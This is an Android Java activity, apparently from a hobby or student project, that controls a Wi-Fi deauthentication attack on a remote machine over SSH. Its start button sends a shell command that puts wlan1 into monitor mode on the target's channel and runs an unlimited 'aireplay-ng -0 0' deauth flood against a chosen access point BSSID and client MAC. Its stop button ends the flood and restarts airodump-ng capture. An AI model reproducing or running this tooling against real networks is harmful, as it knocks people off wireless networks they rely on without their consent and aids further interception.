package com.example.kn_project_app;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;

public class AttackToggle extends AppCompatActivity implements MyCallback {

    TextView nameDevice;
    TextView macAddressDevice;
    TextView nameAccessPoint;
    TextView macAddressAccessPoint;
    Button startAttack;
    Button endAttack;
    TextView channelAndFreq;
    TextView status;

    private boolean mShouldUnbind;
    private SshOperations mBoundService;

    Handler handler;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        handler = new Handler();

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_attack_toggle);

        final Device device = getIntent().getExtras().getParcelable("device");
        Device accessPoint = getIntent().getExtras().getParcelable("accessPoint");

        getSupportActionBar().setTitle(device.getName());

        nameDevice = findViewById(R.id.name);
        macAddressDevice = findViewById(R.id.macAddress);

        nameAccessPoint = findViewById(R.id.nameAccessPoint);
        macAddressAccessPoint = findViewById(R.id.macAddressAccessPoint);

        startAttack = findViewById(R.id.start);
        endAttack = findViewById(R.id.end);

        channelAndFreq = findViewById(R.id.channelAndFreq);
        status = findViewById(R.id.statusOfAttack);

        nameDevice.setText(device.getName());
        macAddressDevice.setText(device.getMacAddress());

        nameAccessPoint.setText(accessPoint.getName());
        macAddressAccessPoint.setText(accessPoint.getMacAddress());

        channelAndFreq.setText("Channel: " + device.getChannel() + " Freq: " + device.getFreqmhz());

        startAttack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.d("WALACH","KLIKNIETO");
                Log.d("--------->", device.getChannel());
                new executeCommand(AttackToggle.this, "killall kismet; killall airodump-ng; airmon-ng stop wlan1; airmon-ng start wlan1 " + device.getChannel() +  " && tmux new-session -d -s deauthAttack 'aireplay-ng -0 0 -a " + device.getBssid() + " -c " + device.getMacAddress() + " wlan1'","Deauthentication attack launched", "Started").execute();
            }
        });

        endAttack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new executeCommand(AttackToggle.this,"killall aireplay-ng; tmux kill-session -t deauthAttack; airmon-ng stop wlan1 " + device.getChannel() + "; airmon-ng start wlan1 && airodump-ng wlan1 --output-format netxml -w /tmp/recent > /dev/null 2>&1","Deauthentication attack interrupted","Ended").execute();
            }
        });

    }

    @Override
    protected void onStart(){
        super.onStart();
        doBindService();
    };

    // ---------------------------------------
    // -------- MY CALLBACK METHODS ----------
    // ---------------------------------------

    public void changeAWSStatus(String text) {}
    public void updateText(String text){
        status.setText("Status: " + text);
    }

    // ---------------------------------------
    // ------ CONNECT TO SSH OPERATIONS ------
    // ---------------------------------------

    private ServiceConnection mConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName className, IBinder service) {
            mBoundService = ((SshOperations.LocalBinder)service).getService();
            mBoundService.setMainActivity(AttackToggle.this);
            Toast.makeText(AttackToggle.this,"TEMP: SSH Connection successfully transformed.", Toast.LENGTH_SHORT).show();
        }
        public void onServiceDisconnected(ComponentName className) {
            mBoundService = null;
            Toast.makeText(AttackToggle.this, "Goodbye SSHOperationClass", Toast.LENGTH_SHORT).show();
        }
    };

    void doBindService() {
        if (bindService(new Intent(AttackToggle.this, SshOperations.class), mConnection, Context.BIND_AUTO_CREATE)) {
            mShouldUnbind = true;
        } else {
            Log.e("MY_APP_TAG", "Error: The requested service doesn't " + "exist, or this client isn't allowed access to it.");
        }
    }

    void doUnbindService() {
        if (mShouldUnbind) {
            unbindService(mConnection);
            mShouldUnbind = false;
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        doUnbindService();
    }

    // ---------------------------------------
    // - BACKGROUND TASK FOR SENDING COMMAND -
    // ---------------------------------------

    private class executeCommand extends AsyncTask<Integer, Void, Void> {
        MyCallback mainActivity;
        String command;
        String toastText;
        String stringToStatus;
        executeCommand (MyCallback mainActivity, String command, String toastText, String stringToStatus){
            this.mainActivity = mainActivity;
            this.command = command;
            this.toastText = toastText;
            this.stringToStatus = stringToStatus;
        }
        @Override
        protected Void doInBackground(Integer... params) {
            mBoundService.sendCommandToAWS(command);
            mainActivity.updateText(stringToStatus);
            handler.post(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(AttackToggle.this, toastText, Toast.LENGTH_SHORT).show();
                }
            });
            return null;
        }
    }
}
